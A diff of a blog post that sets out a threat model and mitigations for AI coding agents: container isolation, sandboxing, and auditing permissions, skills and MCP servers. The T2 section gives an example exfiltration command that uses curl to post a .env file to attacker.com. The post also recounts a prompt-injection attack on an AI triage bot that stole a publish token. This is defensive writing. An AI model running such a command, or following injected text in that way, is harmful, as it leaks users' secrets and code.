@@ -169,13 +169,13 @@
 <p>This isn't hypothetical. I've seen agents wander outside the project directory during normal operation, reading system files trying to be helpful. Usually harmless. But if an agent is compromised or hallucinating, that wandering becomes dangerous. You don't want an agent casually reading through your other project directories or your company's internal documentation just because it's curious.</p>
 <h3 id="t2-data-exfiltration">T2: Data exfiltration</h3>
 <p>An agent with network access can send your code anywhere. It could be something obvious like <code>curl attacker.com -d "$(cat .env)"</code>, or something subtle buried in a script it generates. You probably wouldn't notice either way.</p>
-<p>This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network.</p>
+<p>This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network. If it's client code, that's a breach notification. If it's your own product, that's competitive intelligence in the open.</p>
 <p>We've already seen this pattern in the news where <a href="./developer-tools-are-the-new-attack-surface.html">malicious VS Code AI extensions stole source code from 1.5 million installs</a>. An AI coding agent with network access is the same exfiltration vector, just with more reasoning capability.</p>
 <h3 id="t3-supply-chain-injection">T3: Supply chain injection</h3>
 <p>When an agent runs <code>npm install</code> or <code>pip install</code>, it pulls packages from public registries. If one of those packages is compromised, the malicious code executes with the agent's permissions on your host. This isn't unique to AI agents, but agents make it worse because they install packages autonomously without you reviewing each one.</p>
 <p>This already happened. A <a href="./your-ai-assistant-might-be-working-for-someone-else.html">supply chain attack on Cline CLI</a> compromised the npm publish token. The poisoned package was downloaded roughly 4,000 times in an 8-hour window before it was pulled, installing an autonomous AI agent on each machine. The attacker used prompt injection against Cline's own AI issue triage to steal the token.</p>
 <h3 id="t4-credential-theft">T4: Credential theft</h3>
-<p>SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already <a href="./your-ai-assistant-might-be-working-for-someone-else.html">picking up AI agent configuration files and gateway tokens</a> through broad file-grabbing routines, and dedicated targeting is likely next.</p>
+<p>SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Stolen cloud credentials are how $50K AWS bills happen overnight. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already <a href="./your-ai-assistant-might-be-working-for-someone-else.html">picking up AI agent configuration files and gateway tokens</a> through broad file-grabbing routines, and dedicated targeting is likely next.</p>
 <p>Claude Code's own <a href="https://docs.anthropic.com/en/docs/claude-code/security#sandboxing">sandboxing documentation</a> acknowledges this: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys."</p>
 <h3 id="t5-lateral-movement">T5: Lateral movement</h3>
 <p>An agent with network access can reach anything on your local network. Other machines, internal services, databases. If you're on a corporate network, an agent is one <code>curl</code> away from touching infrastructure it has no business accessing. CrowdStrike documented how <a href="./ai-agents-under-attack.html">agentic tool chain attacks</a> exploit this implicit trust to achieve code execution and data exfiltration through legitimate agent workflows.</p>
@@ -304,6 +304,7 @@
 </tbody>
 </table>
 <p>Some of these are strong mitigations. Others are just friction. I want to be honest about which is which.</p>
+<p>Container isolation, ephemeral sessions, and SSH agent forwarding are the strong ones. The agent genuinely cannot access what isn't mounted, keys that aren't stored, or configs that get rebuilt every launch. The network firewall is effective but has gaps I haven't closed yet (IPv6, CDN IP rotation). Profile isolation works if you remember to set it. Details on each below.</p>
 <h3 id="container-isolation-mitigates-t1-t3-t4">Container isolation (mitigates T1, T3, T4)</h3>
 <p>The most basic control. Claude Code runs inside a Docker container. The only host directory mounted is the project itself. The agent can't read <code>~/.ssh/</code> or <code>~/.aws/</code> because those paths don't exist inside the container.</p>
 <div class="codehilite"><pre><span></span><code>./claudecker.sh<span class="w"> </span>run<span class="w"> </span>/path/to/project
@@ -357,16 +358,16 @@
 <p>Claudecker isn't publicly available. It's deeply integrated into my personal workflow and not something anyone else can pick up and run. But you don't need my tool to act on this threat model. Here are four things you can do right now:</p>
 <ol>
 <li>
-<p><strong>Run your AI agent in a container.</strong> You don't need Claudecker for this. A basic Docker container with your project directory mounted already gives you most of the mitigation table above. The agent gets filesystem isolation, credential separation, and a throwaway environment. That alone covers T1, T4, and T8.</p>
+<p><strong>Audit your <code>settings.local.json</code> (5 minutes).</strong> Open <code>.claude/settings.local.json</code> in your project directory and look at what you've approved. You might find <code>Bash(sudo:*)</code> or other broad patterns you don't remember approving. Clean it up.</p>
 </li>
 <li>
-<p><strong>Enable Claude Code's built-in sandbox.</strong> Run <code>/sandbox</code> in a session. It's not as strict as a container, but it restricts file writes to the working directory and routes network traffic through a domain-approving proxy. It's there, it's free, and most people don't know about it. <a href="https://code.claude.com/docs/en/sandboxing">Documentation here</a>.</p>
+<p><strong>Enable Claude Code's built-in sandbox (1 command).</strong> Run <code>/sandbox</code> in a session. It's not as strict as a container, but it restricts file writes to the working directory and routes network traffic through a domain-approving proxy. It's there, it's free, and most people don't know about it. <a href="https://code.claude.com/docs/en/sandboxing">Documentation here</a>.</p>
 </li>
 <li>
-<p><strong>Audit your <code>settings.local.json</code>.</strong> Open <code>.claude/settings.local.json</code> in your project directory and look at what you've approved. You might find <code>Bash(sudo:*)</code> or other broad patterns you don't remember approving. Clean it up.</p>
+<p><strong>Run your AI agent in a container (30 minutes if you know Docker, half a day if you don't).</strong> A basic Docker container with your project directory mounted already gives you most of the mitigation table above. The agent gets filesystem isolation, credential separation, and a throwaway environment. That alone covers T1, T4, and T8.</p>
 </li>
 <li>
-<p><strong>Review what skills and MCP servers your agent loads.</strong> Each one is third-party code running with your agent's permissions. Check what's installed, where it came from, and whether you still need it. A skill or MCP server you forgot about is an unmonitored attack surface. If you find one you rely on, consider forking it into your own repo. Writing your own skills is even better. It doesn't scale, but at least you know exactly what's running.</p>
+<p><strong>Review what skills and MCP servers your agent loads (10 minutes).</strong> Each one is third-party code running with your agent's permissions. Check what's installed, where it came from, and whether you still need it. A skill or MCP server you forgot about is an unmonitored attack surface. If you find one you rely on, consider forking it into your own repo. Writing your own skills is even better. It doesn't scale, but at least you know exactly what's running.</p>
 </li>
 </ol>
 <p>None of these require building anything. They're just decisions.</p>
